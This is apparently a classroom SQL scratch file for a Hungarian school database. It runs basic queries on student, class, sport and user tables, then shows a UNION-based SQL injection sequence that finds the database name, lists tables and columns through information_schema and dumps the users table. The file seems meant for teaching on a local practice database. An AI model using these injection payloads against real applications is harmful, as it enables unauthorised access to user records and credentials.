CREATE DATABASE `laravel-iskola`
	CHARACTER SET utf8
	COLLATE utf8_hungarian_ci;


SELECT * FROM sports;

SELECT * FROM osztalies;
SELECT * FROM diaks;

SELECT * FROM users;
# DELETE FROM users;

SELECT * FROM sportolas;

SELECT * FROM sportolas WHERE diakokId = 2 AND sportokId = 2;
SELECT * FROM diaks LIMIT 10 OFFSET 3;

# sql injjection
SELECT * FROM diaks WHERE nev = "Feri";

# union
SELECT * FROM diaks UNION SELECT *,'','','','','','','','' FROM osztalies;
##################
SELECT DATABASE();
# Betőrés
SELECT * FROM diaks WHERE nev = "Feri" UNION SELECT DATABASE(), '', '', '', '', '', '', '', '', '';#";
# milyen táblák vannak
SELECT table_name FROM information_schema.tables WHERE nev = "Feri" UNION SELECT DATABASE(), '', '', '', '', '', '', '', '', '' WHERE table_schema = 'laravel-iskola';
#
SELECT * FROM diaks WHERE nev = "Feri" UNION SELECT table_name, '', '', '', '', '', '', '', '', '' FROM information_schema.tables WHERE table_schema = 'laravel-iskola';
#
SELECT * FROM diaks WHERE nev = "Feri" union SELECT column_name, '', '', '', '', '', '', '', '', '' FROM information_schema.columns WHERE  table_name='users' AND table_schema = 'laravel-iskola';#"; 
#
SELECT * FROM diaks WHERE nev = "Feri" UNION SELECT *, '', '' FROM users;#";